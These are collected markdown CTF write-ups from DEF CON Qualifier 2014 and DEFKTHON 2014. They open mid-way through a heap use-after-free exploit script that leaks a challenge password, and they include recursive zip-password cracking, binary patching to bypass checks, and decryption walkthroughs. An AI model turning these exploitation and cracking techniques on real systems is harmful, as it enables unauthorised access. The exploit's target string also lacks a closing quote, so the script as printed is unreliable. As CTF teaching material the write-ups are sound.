HEAP: [ ][   ][   ][   ][   ][ N ][ S ][ S ]
first.next ----/
--------------------------------------------------------------
```

If we create now a new variable with 16bytes strings, the malloc algorithm would shift right by one because the first block is too small for both. That results in having the value string in the location the *first.next pointer still points to. By using good values for the string and link pointers we can get the password out of the memory.

>set_var(s, 'HACKHACKHACKHACK', pack('i', PASSWORD_ADDR) * 2 + pack('i', NULL_NODE_ADDR))


```
--------------------------------------------------------------
                 /----link----\
HEAP: [ ][ S ][ X ][   ][   ][ N ][ S ][ S ]    X = Fake node
first.next ----/
--------------------------------------------------------------
```

After getting the password, we just have needed to use it
> enable SecretPassword
>
> flag

unfotunately, we were not able to solve it in time.


## exploit.py

Set ip and port and use it with ./exploit.py or ./exploit.py -d

```python
#!/bin/python2
import socket
from struct import pack
import logging
import sys

# SETTINGS
###################################
TARGET = 'shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337
#TARGET = 'localhost:5000'

PASSWORD_ADDR =  0x804c3a0
NULL_NODE_ADDR = 0x804c37c

# Don't touch things below
TCP_IP, TCP_PORT = TARGET.split(':')
TCP_PORT = int(TCP_PORT)

BUF_SIZE = 2000
MARKER = 'aaa: '

# LOGGING
logging.basicConfig(format='%(message)s')
log = logging.getLogger(__name__)
if '-d' in sys.argv: log.setLevel(logging.DEBUG)
else: log.setLevel(logging.INFO)
D = log.debug
I = log.info

# HELPERS
###################################
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    data = s.recv(BUF_SIZE)
    D(data)
    return s

def disconnect(s):
    s.send('quit\n')
    data = s.recv(BUF_SIZE)
    D(data)
    s.close()

def show(s):
    cmd = 'show'
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)
    D(data)
    return data

def set_var(s, name, value='1'):
    cmd = 'set %s %s' % ( name, value)
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)

def del_var(s, name):
    cmd = 'set %s' % name
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)

# MAIN
###################################
s = connect()

set_var(s, 'a' * 11, '01234567890ABCDEF')
set_var(s, 'b' * 16, 'AKABKN|OWNS!!!111')
set_var(s, 'C' * 16, 'XXXXXXXXXXXXXXXXX')

del_var(s, 'a' * 11)
del_var(s, 'b' * 16)

set_var(s, 'HACKHACKHACKHACK', pack('i', PASSWORD_ADDR) * 2 + pack('i', NULL_NODE_ADDR))

data = show(s)
found = data.find(MARKER) if data else 0

if found:
    I('Password: %s', data[found + len(MARKER):data.find('\n$')])

disconnect(s)
```

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln>
* <http://www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-1.html>
* <http://v0ids3curity.blogspot.in/2014/05/defcon-quals-2014-gynophage-shitsco-use.html>
* <http://tasteless.eu/2014/05/def-con-ctf-qualifier-2014-shitsco/>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
* <http://sigint.ru/writeups/2014/05/19/defcon-2014-quals--shitsco/>
# DEF CON CTF Qualifier 2014: sick

**Category:** HJ
**Points:** 4
**Description:**

> I am sorry Sick Yoda.
> [services.2014.shallweplayaga.me/comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a](comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a)
> [services.2014.shallweplayaga.me/pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8](pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8)

## Write-up

(TODO)

## Other write-ups and resources

* (none yet)
# DEF CON CTF Qualifier 2014: turdedo

**Category:** Selir
**Points:** 3
**Description:**

> What a crappy protocol
> `turdedo_5f55104b1d60779dbe8dcf5df2b186ad.2014.shallweplayaga.me:3544`
> [http://services.2014.shallweplayaga.me/turdedo_5f55104b1d60779dbe8dcf5df2b186ad](turdedo_5f55104b1d60779dbe8dcf5df2b186ad)

## Write-up

(TODO)

## Other write-ups and resources

* <http://acez.re/ctf-writeup-defcon-quals-2014-turdedo/>
* <http://idabook.com/ctf/turdedo_writeup.txt>
# DEF CON CTF Qualifier 2014: zombies

**Category:** Duchess
**Points:** 2
**Description:**

> Aim small, miss small. Or not...your call.
>
> `zombies_8977dda19ee030d0ea35e97ad2439319.2014.shallweplayaga.me 20689`

## Write-up

TODO: Add detailed challenge description

Here is a working example:

```python
import socket
import math
import numpy
import time

def parse_level(text):
  level = 0
  for line in text.split('\n'):
    if line.strip().startswith("Level"):
      levelline = line.strip().split()
      level = int(levelline[1])

  if level < 10:
    x,y = parse_level1(text)
  else:
    x,y = parse_level2(text)

  return x, y

def parse_level1(text):
  x = 0
  y = 0
  level = 0
  for line in text.split('\n'):
    if line.startswith("The zombie is stalking"):
      line = line.split()
      x = int(line[6].replace('m', ''))
      y = int(line[11].replace('m', ''))
      print "Zombie is at: "
      print "x: ", x
      print "y: ", y
  return x,y

def parse_level2(text):
  x = 0
  y = 0
  level = 0
  for line in text.split('\n'):
    if line.startswith("The zombie is stalking"):
      splitline = line.split()
      zx = int(splitline[14].replace('m', ''))
      zy = int(splitline[19].replace('m', ''))
      px = int(splitline[28].replace('m', ''))
      py = int(splitline[33].replace('m', ''))

      print "Zombie is at: "
      print "x: ", zx
      print "y: ", zy
      print "Puppy is at: "
      print "x: ", px
      print "y: ", py

    if line.find("eats the puppy") != -1:
      eta = int(line.split(' ')[2])
      print "ETA dead puppy:", eta

    if line.find("gone by") != -1:
      # Consider +1 because of the wait
      my_time = int(line.split(' ')[0]) + 1
      print "Elapsed time:", my_time + 1

  new_x, new_y = calculate_position(zx, zy, px, py, eta, my_time)
  dummy = s.recv(1024)
  print dummy
  return new_x,new_y

def calculate_angle(velocity, x, y):

  angle1 = None
  angle2 = None

  g = 9.80665
  root = math.sqrt( (velocity**4) - g*( (g * (x**2)) + (2 * y * (velocity**2)) ))
  print "G", x
  angle1 = numpy.arctan((velocity**2 + root) / (g*x))
  angle2 = numpy.arctan((velocity**2 - root) / (g*x))

  angle1 = 180 * angle1 / math.pi
  angle2 = 180 * angle2 / math.pi

  print "Calculated angles:"
  print "Angle1:", angle1
  print "Angle2:", angle2

  return angle1, angle2

def calculate_position(zx, zy, px, py, eta, mytime):

  distx = px - zx
  disty = py - zy

  ratio = float(mytime) / float(eta)

  new_x = (distx * ratio) + zx
  new_y = (disty * ratio) + zy

  print "new coords:", new_x, new_y

  return new_x, new_y

def shoot(angle, x, y, gun="r"):

  dump = ""
  if gun == 'r':
    dump += "r, "
    # I'm sorry...
    global rcpt
    rcpt += 1
    print "Riffle count: " ,rcpt
  else:
    dump += "p, "
    # I'm sorry...
    global pcpt
    pcpt += 1
    print "pistol count: ", pcpt
  angle = str(angle)
  dump += angle + ', '
  dump += str(x) +", "
  dump += str(y) + "\n"

  print "Sending:"
  print dump

  s.send(dump)
  data = s.recv(1024)
  print data
  return data


HOST = "zombies_8977dda19ee030d0ea35e97ad2439319.2014.shallweplayaga.me"
PORT = 20689

RIFFLE = "2\n"
PISTOL = "3\n"

riffle_velocity = 975
pistol_velocity = 375

rcpt = 0
pcpt = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

# intro
data = s.recv(1024)

# pick guns
s.send(RIFFLE)
data = s.recv(1024)
s.send(PISTOL)
data = s.recv(1024)
print data

#Game Start
while(True):
  # Need to sleep otherwise misses on gun changes
  # This needs to be accounted for in the zombie's position
  time.sleep(2)
  x, y = parse_level(data)
  # Hint said 50ish... not enough pistolling at 50ish
  if x < 55 and pcpt < 43:
    a1, a2 = calculate_angle(pistol_velocity, x, y)
    data = shoot(a2, x, y, gun='p')
  else:
    a1, a2 = calculate_angle(riffle_velocity, x, y)
    data = shoot(a2, x, y, gun='r')
  if data.lower().find("flag") != -1:
    break

s.close()
```

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/05/19/defcon-2014-quals---zombies/>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
# DEFKTHON CTF: Crypto 100

**Description:**

> ucoizsbtkxhtadcg

## Write-up

During the CTF, [a hint for this challenge was provided](https://twitter.com/OpenSecurity_IN/status/440755363285966848):

> [Crypto 100] Clue: Vinegar

Since this is crypto challenge, the clue could be an indication that this is a [Vigenère cipher](http://en.wikipedia.org/wiki/Vigenère_cipher).

Let’s fire up a Windows VM, open Cryptool 1, enter the ciphertext `ucoizsbtkxhtadcg`, and do some analysis. Go to _Analysis_ → _Symmetric Encryption (Classic)_ → _Vigenère (Analysis according to Schroedel…)_ and click _Start analysis_. The analysis takes a few minutes. Once it’s finished, click _Show analysis results_, and exactly 9011 possible encryption keys and deciphered texts are presented:

```
CrypTool: Ciphertext-only analysis according to Schroedel against Vigenère cipher
Time needed to perform analysis:758 seconds
Length of analyzed ciphertext: 16 characters
Keyword language(s): English
Ciphertext language: English

Ciphertext:
UCOIZSBTKXHTADCG

…
```

At this point I guessed that either the encryption key or the deciphered text would contain `FLAG` so I searched the result set for that. It turned out that many of the deciphered texts started with `FLAGIS`, so I decided to focus on those first:

```bash
$ grep -B3 'FLAGIS' results.txt
114. Possible key:
PROCRASTINATIONS
Found cleartext:
FLAGISJACKHASPPO
--
418. Possible key:
PROCRASTINATING
Found cleartext:
FLAGISJACKHASQWR
--
419. Possible key:
PROCRASTINATION
Found cleartext:
FLAGISJACKHASPPR
--
420. Possible key:
PROCRASTINATORS
Found cleartext:
FLAGISJACKHAMMKR
--
836. Possible key:
PROCRASTINATED
Found cleartext:
FLAGISJACKHAWANP
--
837. Possible key:
PROCRASTINATES
Found cleartext:
FLAGISJACKHAWLNP
--
838. Possible key:
PROCRASTINATOR
Found cleartext:
FLAGISJACKHAMMNP
--
1493. Possible key:
PROCRASTINATE
Found cleartext:
FLAGISJACKHAWOLS
```

At this point I tried entering `JACKHASPPO`, `JACKHASQWR`, etc. as the flag, but none of them were accepted. Looking through the list again, one of the cleartexts stood out:

```
420. Possible key:
PROCRASTINATORS
Found cleartext:
FLAGISJACKHAMMKR
```

`JACKHAMMKR` wasn’t accepted either, and neither was `JACKHAMMER`. However, since the ciphertext was originally in lowercase instead of uppercase, I figured the expected cleartext was probably in lowercase too. So I guessed `jackhammer` was the flag, which turned out to be correct!

P.S. With the knowledge that `jackhammer` is the correct flag, we can figure out the encryption key that was originally used: `PROCRASTINATORY`. (Apparently this word is not included in the English dictionary used by Cryptool.)

## Other write-ups and resources

* none yet
# DEFKTHON CTF: Crypto 200

**Description:**

> [RSA!!](encr02.7z)

## Write-up

The provided [`encr02.7z`](encr02.7z) archive contains two files: `enc` and `rsa`. The former is (from its name) clearly an encrypted message. The filename and contents of the latter hint that the message is encrypted with RSA. The `rsa` file is just a JSON file, with base64-encoded values for properties such as `primeP` and `primeQ` and a more interesting one: `privateExponent`. Unless this is a red herring, this private-key value can be used to decrypt the encrypted message.

Given that the `rsa` file is a "structured" JSON file, lead me to believe that it was exported from some application. Searching for the properties on Google, quickly showed that it came from [Keyczar](https://code.google.com/p/keyczar/), "an open source cryptographic toolkit designed to make it easier and safer for developers to use cryptography in their applications". Knowing this, the decryption would be straightforward: read the private key into Keyczar and use that to decrypt the message.

Actually, it required an additional step, because of (correct me if I'm incorrect) [key encapsulation](http://en.wikipedia.org/wiki/Key_encapsulation). Apparently, only the first 261 characters of the encrypted message could be decrypted using the RSA key (I figured out it was 261 by encrypting several strings, and these always resulted in a 261-character-long string). The decryption of the first 261 characters of the encrypted message results in following JSON string:

``` json
{"hmacKey": {"hmacKeyString": "L_YKADwsSRdPYYioRV-xjn0cWHCKnBIc1j8EmJzRrJY", "size": 256}, "aesKeyString": "zzqP2s4p8XWuFLhXbhLxoQ", "mode": "CBC", "size": 128}
```

This JSON data referencing an AES-key can then be used in Keyczar to decrypt the rest of the message, which eventually results in finding the flag: `the flag is hipsteralert`. The following snippet shows how this challenge can be solved with just a handful of lines of Python code (note that it requires the `python-keyczar` package).

``` python
with open('rsa', 'r') as f:
    rsa = f.read()
with open('enc', 'rb') as f:
    enc = f.read()
import keyczar.keys
key = keyczar.keys.RsaPrivateKey.Read(rsa)
rsaDecrypted = key.Decrypt(enc[:261]) # use RSA to decrypt first 261 ( = len(key.Encrypt('foo')) ) characters of enc
aesKey = keyczar.keys.AesKey.Read(rsaDecrypted)
print aesKey.Decrypt(enc[261:]) # use AES to decrypt the rest of enc
```

## Other write-ups and resources

* none yet
# DEFKTHON CTF: Crypto 300

**Description:**

> The key to finding the truth lies with my namesake. [Download](encr03.jpg)

## Write-up

This is a photo of Emma Stone. (TODO)

## Other write-ups and resources

* none yet
# DEFKTHON CTF: Crypto 400

**Description:**

> Alice and Bob went a long way in crypto. They designed a super secure crypto system to encrypt their messages. We managed to steal the source and some other information. Find the FLAG!
>
> [File](challenge.txt)
> We also got this: [Download](400.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-find-flag-crypto-400.html>
# DEFKTHON CTF: Miscellaneous 100

**Description:**

> He is so FAT.
> Flag is the md5 of a windows command with numericals in it.

## Write-up

Apparently the expected answer was `289cca92d315659c671f51ad8e0f06d3`, the MD5 hash of `8dot3name`. This is not really a Windows command, though – although it can be used as an argument to [`fsutil`](http://technet.microsoft.com/en-us/library/ff621566.aspx).

## Other write-ups and resources

* none yet
# DEFKTHON CTF: Miscellaneous 200

**Description:**

> [Flag is Here!](flag.txt)

## Write-up

The provided `flag.txt` file contains tuples of three comma-separated values on each line. This looks like an image with given RGB values.

In total, there are 61366 lines:

```bash
$ wc -l flag.txt
61366 flag.txt
```

The dimensions of the image are dividers of this number, so possibly: 1, 2, 61, 122, 503, 1006, 30683, 61366. The most likely image size is 122×503px or 503×112px.

### Solution 1: using PPM

The easiest way to convert this text file into an image, is by converting it to the PPM format with the following header:

```ppm
P3
122 503
255
```

…then followed by the contents of `flag.txt`, with any commas replaced by spaces. The result is [`flag.ppm`](flag.ppm).

Let’s convert it to PNG, and flip + rotate it to make it easier to read:

```bash
$ convert -flip -rotate 90 flag.ppm flag.png
```

This results in [the following image](flag.png):

![flag{ youc@n'tseeme }](flag.png)

### Solution 2: using Python and PIL

Using some string parsing and the Python Imaging Library (PIL), an image can be drawn pixel by pixel from the given RGB values.  The dimensions were the tricky part, as using exact multiples overflowed the program, so using one set value for the width and a very high number for the height, the image was drawn well enough.

```python
from PIL import Image
import numpy

pixels = open("flag.txt").read().split("\n")
del pixels[-1]

myPixelsArray = ()

for x in pixels:
  array = x.split(",")
  array = tuple([int(w) for w in array])
  myPixelsArray += array

myImage = Image.new("RGB", (122, 503))

myImage.putdata(myPixelsArray)

myImage.save("flag.jpg")
```

The image, when cropped and flipped, shows the following:

![flag{ youc@n'tseeme }](flag.jpg)

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-flag-is-here-misc-200.html>
* <http://www.cravetocode.com/2014/03/defkthon-ctf-misc-200-writeup.html>
* <http://tasteless.eu/2014/03/defkthon-ctf-2014-rev200-misc200-recon200-misc300/>
* <https://shankaraman.wordpress.com/2014/03/05/defkthon-ctf-misc-200-writeup/>
* [Russian](http://reu.org.ua/ctf/write-up-defkthon-ctf-2014-misc-200.html)
# DEFKTHON CTF: Miscellaneous 300

**Description:**

> [Check This](73168.zip)

## Write-up

The provided [`73168.zip`](73168.zip) file is password-protected. Cracking the password using `fcrackzip` reveals that an all-numeric password was used, and that the zip file contains another password-protected zip file, which in turn contains another password-protected zip file, etc.

Let’s write a script that recursively cracks and extracts the zip files:

```bash
#!/usr/bin/env bash

while [ -e *.zip ]; do
  files=*.zip;
  for file in $files; do
    echo -n "Cracking ${file}… ";
    output="$(fcrackzip -u -l 1-6 -c '1' *.zip | tr -d '\n')";
    password="${output/PASSWORD FOUND\!\!\!\!: pw == /}";
    if [ -z "${password}" ]; then
      echo "Failed to find password";
      break 2;
    fi;
    echo "Found password: \`${password}\`";
    unzip -q -P "${password}" "$file";
    rm "${file}";
  done;
done;
```

Leave it running for a while, and you’ll end up with `12475.zip`, a zip file with a slightly more complex password. Let’s crack it:

```bash
$ fcrackzip -u -l 1-6 -c 'a1' 12475.zip
PASSWORD FOUND!!!!: pw == b0yzz
```

The password is `b0yzz`. Let’s unzip:

```bash
$ unzip -q -P b0yzz 12475.zip
```

We end up a file named [`mess.wav`](mess.wav). Open it in a sound editor like Audacity, and view the sound waves as a spectrogram.

![](flag.jpg)

It reveals the text `BallsRealBolls`, which is the flag.

## Alternative approach

An alternative way to come up with the passwords for all the intermediate zip files, is by using `unzip -l` to list the compressed file’s file name (which was always the same as the password for the parent zip for this challenge):

```bash
#!/usr/bin/env bash

f="$1";

while test -e "$f"; do
  mv "$f" _a.zip;
  p=$(unzip -l _a.zip | grep -v Archive | grep zip | awk '{print $NF}' | sed 's:\.zip::'| head -1);
  echo "File = '_a.zip', password = '$p'";
  unzip -P "$p" _a.zip;
  f="$p.zip";
  ls -l "$f";
done;
```

## Other write-ups and resources

* <http://tasteless.eu/2014/03/defkthon-ctf-2014-rev200-misc200-recon200-misc300/>
* <http://juicy-media.ru/dv_team/writeups/index.php?cnt=DEFKTHON&cat=Misc&prc=300.
* <https://shankaraman.wordpress.com/2014/03/05/defkthon-ctf-misc-300-writeup/>
# DEFKTHON CTF: Miscellaneous 400

**Description:**

> TODO

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# DEFKTHON CTF write-ups

* <http://54.201.96.212/>
* [Official Twitter account with challenge hints](https://twitter.com/OpenSecurity_IN)
* [Scoreboard](http://54.201.96.212/Score)

## Completed write-ups

* [crypto-100](crypto-100)
* [crypto-200](crypto-200)
* [misc-100](misc-100)
* [misc-200](misc-200)
* [misc-300](misc-300)
* [recon-100](recon-100)
* [recon-200](recon-200)
* [recon-250](recon-250)
* [reversing-100](reversing-100)
* [reversing-200](reversing-200)
* [reversing-300](reversing-300)
* [reversing-400](reversing-400)
* [web-200](web-200)
* [web-300](web-300)
* [web-400](web-400)

## External write-ups only

* [crypto-400](crypto-400)

## Missing write-ups

* [crypto-300](crypto-300)
* [misc-400](misc-400)
* [web-100](web-100)
# DEFKTHON CTF: Recon 100

**Description:**

> [Francis Alexander](https://www.google.co.in/#q=Francis+Alexander)

## Write-up

Francis Alexander is a programmer who works for Opensec. He has a GitHub account: <https://github.com/torque59> This account has <http://wiredcreation.blogspot.in/> set as the website for this user.

The flag is hidden on <http://wiredcreation.blogspot.in/2014/02/nosql-exploitation-framwework-released.html>. Inspect the DOM using your browser’s developer tools to look for HTML comments (note: plain view-source won’t work as the content is loaded through Ajax). You’ll eventually see this:

```html
<!-- flag{hmm_try_nosql_dbs_dude}-->
```

The flag is `hmm_try_nosql_dbs_dude`.

## Other write-ups and resources

* <http://ctfwriteups.blogspot.in/2014/03/defkthon2014-recon-100.html>
# DEFKTHON CTF: Recon 200

**Description:**

> [Yashin Mehaboobe](https://www.google.com/#q=Yashin+Mehaboobe)

## Write-up

The Google search results indicate that Yashin has a GitHub account named [@Sp3ctr3](https://github.com/Sp3ctr3). His recent activity reveals [a commit with the following details](https://github.com/Sp3ctr3/arcanum-server/commit/40fd912b6d9f0cf022b10fac72a6c7b6760bfe37):

```
From 40fd912b6d9f0cf022b10fac72a6c7b6760bfe37 Mon Sep 17 00:00:00 2001
From: Yashin Mehaboobe <yashinm92@gmail.com>
Date: Mon, 10 Feb 2014 23:19:29 +0530
Subject: [PATCH] Updated README for better readability.

Flag is djangounchained
```

The flag is `djangounchained`.

## Other write-ups and resources

* <http://tasteless.eu/2014/03/defkthon-ctf-2014-rev200-misc200-recon200-misc300/>
* <http://ctfwriteups.blogspot.in/2014_03_01_archive.html>
# DEFKTHON CTF: Recon 250

**Description:**

> Crack Ajin’s [message](http://pastebin.com/nGvKgY23).
> Only [Ajin Abraham](https://www.google.com/#q=ajin+abraham) can help you!

## Write-up

The message provided in the challenge description is a PGP-encrypted email. Let’s start by downloading it and saving it as [`message.pgp`](message.pgp):

```bash
$ curl 'http://pastebin.com/raw.php?i=nGvKgY23' > message.pgp
```

In order to decrypt the message, we’re gonna need the private key used to encrypt it.

Luckily, the HTML source code of [Ajin’s website](http://opensecurity.in/ajinabraham.com/) has this in it:

```
<!--pastebin DOT com/TYHfKbtt-->
```

This leads to a PGP private key. Let’s download it and save it as [`private.key`](private.key):

```bash
$ curl 'http://pastebin.com/raw.php?i=TYHfKbtt' > private.key
```

Now let’s import the private key and use it to decrypt the message:

```bash
$ gpg --allow-secret-key-import --import private.key
gpg: key 8708771F: secret key imported
gpg: key 8708771F: "xboz <xboz@mailinator.com>" not changed
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ gpg --decrypt message.pgp

You need a passphrase to unlock the secret key for
user: "xboz <xboz@mailinator.com>"
4096-bit RSA key, ID 8708771F, created 2014-02-18

Enter passphrase:
```

Too bad; we need the private key’s passphrase before we can decrypt the message. You could bruteforce the passphrase, but there was another way to get it for this challenge. [Ajin’s contact form](http://opensecurity.in/ajinabraham.com/) contains the following HTML:

```html
<p id="mail-failure">Unable to send your email! (--wankoff--)</p>
```

It turns out `wankoff` is the passphrase.

```bash
$ gpg --decrypt message.pgp

You need a passphrase to unlock the secret key for
user: "xboz <xboz@mailinator.com>"
4096-bit RSA key, ID 8708771F, created 2014-02-18

gpg: WARNING: cipher algorithm AES256 not found in recipient preferences
gpg: encrypted with 4096-bit RSA key, ID 8708771F, created 2014-02-18
      "xboz <xboz@mailinator.com>"
flag { Pretty007G00d007Privacy }
```

The flag is `Pretty007G00d007Privacy`.

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-crack-ajins-message.html>
# DEFKTHON CTF: Reversing 100

**Description:**

> [Hackers are Here](100.exe)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

First we want to know the type of file we are dealing with. On Linux `file 100.exe` returns that it's a .NET assembly. If you open it in IDA you will also be told it's a .NET program. For a bit of background, there's also [TrID](http://mark0.net/soft-trid.html) to identify file types, [PROTECTiON iD](http://pid.gamecopyworld.com/) to detect binary packets, the older [PEiD](http://www.aldeid.com/wiki/PEiD), etc.

I used [IDA](https://www.hex-rays.com/products/ida/) to view the .NET intermediate language instructions, and [JetBrains dotPeek](http://www.jetbrains.com/decompiler/) to disassemble the code. After removing all useless code dotPeek shows the following:

```
private void pictureBox1_Click(object sender, EventArgs e)
{
  try
  {
    int num1 = (int) MessageBox.Show([...]);
    int num2 = 1337;
    int num3 = 0;
    int num4 = int.Parse(string.Concat(new object[4]
    {
      (object) "121299999999999999999999999999999999999B0wB4me4iamr",
      (object) num3,
      (object) num3,
      (object) "t99999999999999999999999999999999999999"
    }));
    string str = (string) (object) num2 + (object) num4.ToString();
    for (int index = 0; index <= num4; ++index)
      num4 = num4 + (num2 ^ 1337) + num2 * 2000 / 1337 / 1337 / 24;
    this.Usehint();
  }
  catch { }
}

public void Usehint() { }

private void InitializeComponent()
{
  [...]
  this.label1.Location = new Point(701, 242);
  this.label1.Text = "      key is md5(sha1)";
  [...]
}
```

We see the hint `key is md5(sha1)`, which is not visible when running the program because the position of the label is outside the window. So we need to find a key and calculate the MD5 and SHA1 hash of it. Though the `Usehint()` function appears empty, in IDA we can see that it actually loads a string but does nothing with it:

```
.method public hidebysig instance void Usehint() // CODE XREF: pictureBox1_Click
{
  .maxstack 1
  .locals init (string V0)
  nop
  ldstr    "get_key_from_hint"
  stloc.0
  ret
}
```

So the last place to look for this hint is the horribly coded `pictureBox1_Click` function. Do we somehow have to fix this function and run it? Because now it throws exceptions. Staring at it a bit longer, the string constructed by the program contains `B0wB4me4iamr00t`. This is the key. I know, it doesn’t make much sense…

The solution becomes:

```bash
$ echo -n "B0wB4me4iamr00t" | sha1sum
9df54a6411ed678cdc925b26794052a882830c25  -
echo -n "9df54a6411ed678cdc925b26794052a882830c25" | md5sum
58b4d49e5489be09fc409e4c0b5e66ad
```

The solution is `58b4d49e5489be09fc409e4c0b5e66ad`.

## Other write-ups and resources

* <http://ctfwriteups.blogspot.in/2014/03/defkthon-2014-reversing-100.html>
# DEFKTHON CTF: Reversing 200

**Description:**

> [Segmentation Fault](200)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

The file is a normal Linux 32-bit ELF binary. Open it up in IDA and we see theres a `main` function and a `lol` function. The reverse engineered main function corresponds to the code below. I inlined several comments to explain what the code is trying to accomplish.

```
int main()
{
  int pipefd[2];
  int pid;
  int userinput;
  char kidid[30];

  // Create pipe for communication between child and parent
  pipe(pipefd);

  pid = fork();
  if ( !pid )
  {
    // ----- Start Child Process -----

    // Send Kid ID to the parent process using the pipe
    puts("\nDamn!! i lost my Kid's ID");
    write(pipefd[1], "42447255344574653276838751", 29);

    // Fake segmentation fault message and exit
    puts("Segmentation Fault");
    exit(0);
  }

  // ----- Start Parent Process -----

  // User must enter pid of the child process ("lost my Kid's ID")
  read(pipefd[0], kidid, 29);
  scanf("%d", &userinput);
  if ( userinput == pid )
  {
    // Did the user place a breakpoint on the lol() function? If so, exit.
    if ( *((char *)lol + 3) == 0xCC ) {
      puts(":D");
      exit(1);
    }

    // Got the kid ID from child process, now derive the key from it
    printf("\nGo for the Key!\n ");
    lol(kidid);
  }

  wait(0);
  return 0;
}
```

So the child sends an ID to the parent and then exits. The parent does a simple anti-debugging check by seeing if the user placed a breakpoint on the main function. Recall that 0xCC corresponds to an `int3` instruction, which is a software breakpoint. A debugger normally places this instruction after the function prologue (hence the +3).

Using the latest IDA version we can remove the `userinput == pid` if-test using the Edit -> Patch Program -> "Change byte" and "Apply patches to input file". Replacing it with NOPs gives:

```nasm
call    ___isoc99_scanf
mov     eax, [esp+24h]
cmp     eax, [esp+20h]
nop
nop
mov     eax, offset lol
```

While we’re at it, let’s also remove the call to `scanf`. Now we don’t need to worry anymore about giving the correct input. The `lol` function performs some calculations and ends with the following `if`-test:

```nasm
mov     [ebp+var_C], 0
cmp     [ebp+var_C], 1
jnz     short _nope_not_this

mov     eax, offset format ; "%s"
lea     edx, [ebp+var_13]
mov     [esp+4], edx
mov     [esp], eax      ; format
call    _printf
jmp     short _return

_nope_not_this:
mov     eax, offset aNope_not_this_ ; ASCII string "Nope_Not_This_:("
mov     [esp], eax      ; format
call    _printf
```

In other words, it always jumps to `\_nope\_not\_this`, because it’s a hardcoded `if`-test that compares `0` with `1`. If we again patch away this `if`-test using NOPs it will `printf` some string that was generated by the function. This string turns out to be the solution to the challenge: `dignige`.

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-segmentation-fault.html>
* <http://tasteless.eu/2014/03/defkthon-ctf-2014-rev200-misc200-recon200-misc300/>
* [Japanese](http://hority-ctf.blogspot.jp/2014/03/defkthon-ctf-2014-write-up.html)
* [Russian](http://reu.org.ua/ctf/write-up-defkthon-ctf-2014-rev-200.html)
# DEFKTHON CTF: Reversing 300

**Description:**

> [Password](300.exe)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

So `file 300.exe` says that it’s an ordinary PE32 windows executable. When opening it in IDA and viewing all the strings referenced by the program, we see a lot of Python API functions that are dynamically loaded. It turns out the executable is also a valid ZIP file, and this zip file contains the `hashlib` python module. This is an open source module, suggesting that the program somehow uses this module to check the password entered by the user.

We want to extract the embedded python code. One string located close to the python API function names is `_MEIPASS2`. This string is an environment variable used by [PyInstaller](http://www.pyinstaller.org/export/develop/project/doc/Manual.html). Lucky for us, PyInstaller has a tool called ArchiveViewer to extract Python code from a created executable. Using `ArchiveViewer.py` we extract the python file `challenge1`:

```py
#AJIN ABRAHAM | OPENSECURITY.IN
from passlib.hash import cisco_pix as pix
import sys,base64
user=""
xx=""
if(len(sys.argv)>1):
     x=sys.argv[1]
     hashus = pix.encrypt("DEFCON14-CTF-IS", user=x)
     z=[89,86,69,121,100,82,69,103,98,47,48,103,80,71,77,121]
     for zz in z:
          xx+= chr(zz+(275*100001-275*1000-27225274))
     hashgen = pix.encrypt("DEFCON14-CTF-IS", user=base64.decodestring(xx))
     if(hashgen==hashus):
          print "Oh Man You got it! But :( ===>    " + str(base64.encodestring(base64.decodestring(xx)))
     else:
          print "Naaaaaaa !! You are screweD"
else:
     print "Password !!"
```

As you can see, it stores the password in obfuscated form. Then it uses the key `DEFCON14-CTF-IS` to encrypt both the stored password, and the password entered by the user. We can easily find the password by including the line `print base64.decodestring(xx)`. This prints `easy!asMa@ss`.

## Other write-ups and resources

* <http://rce4fun.blogspot.com/2014/03/defkthon-ctf-2014-reversing-300-writeup.html>
* [Japanese](http://hority-ctf.blogspot.jp/2014/03/defkthon-ctf-2014-write-up.html)
# DEFKTHON CTF: Reversing 400

**Description:**

> [BIN](400.bin)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

Running `file 400.bin` gives no useful information: it only detects data. Similarly, `strings 400.bin` also provides no useful information. Executing `binwalk 400.bin` to extract possible hidden files reveals a Squashfs filesystem with a DD-WRT signature:

```bash
$ binwalk 400.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 2709328 bytes
851968        0xD0000         Squashfs filesystem, big endian, DD-WRT signature, version 3.0, size: 2787244 bytes,  676 inodes, blocksize: 131072 bytes, created: Sat Jan 11 14:04:28 2014
```

So we’re dealing with a DD-WRT firmware image.

